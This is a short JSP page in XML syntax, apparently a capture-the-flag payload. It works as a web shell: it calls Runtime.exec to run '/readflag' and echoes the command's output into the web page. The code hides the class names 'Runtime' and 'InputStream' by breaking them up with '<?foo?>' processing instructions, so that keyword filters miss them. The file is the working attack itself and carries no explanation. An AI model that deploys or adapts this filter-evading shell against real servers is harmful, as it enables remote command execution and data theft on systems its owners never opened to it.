<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"
 version="1.2">
<jsp:directive.page contentType="text/html"/>
<jsp:directive.page import="java.io.*"/>
<jsp:declaration>
</jsp:declaration>
<jsp:scriptlet>
Process p = Run<?foo?>time.getRun<?foo?>time().exec("/readflag");
BufferedReader input = new BufferedReader(new InputSt<?foo?>reamReader(p.getInputSt<?foo?>ream()));
String line = "";
while ((line = input.readLine()) != null) {
  out.write(line+"\n");
}
</jsp:scriptlet>
<jsp:text>
</jsp:text>
</jsp:root>